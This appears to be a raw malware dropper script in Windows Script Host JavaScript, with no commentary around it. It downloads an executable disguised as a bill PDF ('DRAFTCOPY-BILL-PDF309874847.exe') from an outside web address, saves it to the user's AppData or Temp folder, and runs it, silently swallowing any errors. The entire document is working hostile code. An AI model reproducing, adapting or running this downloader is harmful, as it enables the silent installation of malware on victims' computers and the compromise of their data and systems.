try{String.prototype.endsWith = function(needle){	var emp = this.substr(this.length - needle.length);	return emp == needle;};var wshShell = WScript.CreateObject("WScript.Shell");var tempdir = wshShell.ExpandEnvironmentStrings("%temp%");var appdatadir = wshShell.ExpandEnvironmentStrings("%appdata%");var path = "DRAFTCOPY-BILL-PDF309874847.exe";var url = "https://edufin-fcpcbiessimbabura.com.ec/dd/DRAFTCOPY-BILL-PDF309874847.exe";var is_temp = false;if(is_temp){	path = tempdir + "\\" + path;}else{	path = appdatadir + "\\" + path;}var xHttp = WScript.CreateObject("Microsoft.XMLHTTP");xHttp.open("GET", url, false);xHttp.send();if(xHttp.status == 200){	var bStrm = WScript.CreateObject("Adodb.Stream");	bStrm.Type = 1;	bStrm.open();	bStrm.write(xHttp.responseBody);	bStrm.savetofile(path, 2);	bStrm.close();	if(path.endsWith(".jar")){		wshShell.run("java -jar \"" + path + "\"");	}else if(path.endsWith(".vbs") || path.endsWith(".wsf")){		wshShell.run("wscript \"" + path + "\"");	}else{		wshShell.run("\"" + path + "\"");	}}else{	WScript.Echo("Expired link");}}catch(err){}